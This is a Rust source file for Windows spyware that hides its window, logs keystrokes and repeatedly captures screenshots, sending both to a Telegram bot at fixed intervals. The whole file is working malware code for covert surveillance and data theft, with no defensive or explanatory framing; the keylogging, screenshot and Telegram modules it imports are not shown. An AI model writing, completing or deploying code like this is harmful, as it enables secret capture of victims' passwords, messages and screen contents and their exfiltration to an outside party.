#![windows_subsystem = "windows"]

use std::fmt::format;
use std::ops::Sub;
use std::sync::mpsc::Sender;
use crate::screen_capture::save_screenshot;

mod telegram_client;
mod screen_capture;
mod screenshot_lib;
mod key_log;

use std::time::{Duration, SystemTime};
use chrono::{Datelike, DateTime, Timelike, Utc};
use libc::time;
use tokio::sync::{mpsc, oneshot};
use telegram_client::TelegramClient;
use crate::key_log::do_logging;

#[tokio::main]
async fn main() {
    run().await;
}

async fn run() {
    const NUMBER_OF_THREADS: i32 = 4;
    const SEND_PHOTO_INTERVAL_MILLIS: u128 = 12000;
    const SEND_LOGS_INTERVAL_MILLIS: u128 = 5000;

    // keylogging
    tokio::spawn(async move {
        let mut client = TelegramClient::from_env().await;
        let mut last_time = SystemTime::now();
        let mut print = Vec::new();
        loop {
            let add_vec = do_logging();
            for i in add_vec {
                let mut add = i.clone();
                print.push(add);
            }
            if (SystemTime::now().duration_since(last_time).unwrap().as_millis() > SEND_LOGS_INTERVAL_MILLIS) {
                if (print.len() > 1) {
                    let mut messg = "".to_string();
                    for i in print {
                        messg.push_str(&format!("{}", i));
                    }
                    client.send_text(messg).await;
                }
                last_time = SystemTime::now();
                print = Vec::new();
                print.push("[LOGS]\n".to_string());
            }
        }
    });

    let start = SystemTime::now();
    let (req_sender, mut req_receiver) = mpsc::channel::<oneshot::Sender<String>>(32);
    tokio::spawn(async move {
        let mut last_time = SystemTime::now().sub(Duration::from_millis(1000000));
        while let Some(mut responder) = req_receiver.recv().await{
            if SystemTime::now().duration_since(last_time).unwrap().as_millis() > SEND_PHOTO_INTERVAL_MILLIS {
                last_time = SystemTime::now();
                responder.send("ok".to_string());
            } else {
                responder.send("no".to_string());
            }
        }
    });
    req_sender.clone();
    for i in 0..NUMBER_OF_THREADS {
        let cur_req_sender = req_sender.clone();
        tokio::spawn(async move {
            let mut client = TelegramClient::from_env().await;
            loop {
                let (perm_sender, perm_receiver) = oneshot::channel::<String>();
                cur_req_sender.send(perm_sender).await.unwrap();
                if perm_receiver.await.unwrap() == "ok" {
                    let now: DateTime<Utc> = Utc::now();
                    let st = SystemTime::now();
                    let mut screen_data = save_screenshot();
                    let vec = screen_data.into_inner();
                    client.send_image_withcaption(vec, format!(
                        "[IMAGE] {} {:02} {:02} {:02}:{:02}:{:02}", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second())).await;
                }
                tokio::time::sleep(Duration::from_millis(80)).await;
            }
        });
    }
    tokio::time::sleep(Duration::from_millis(1000000000000000000)).await;
}
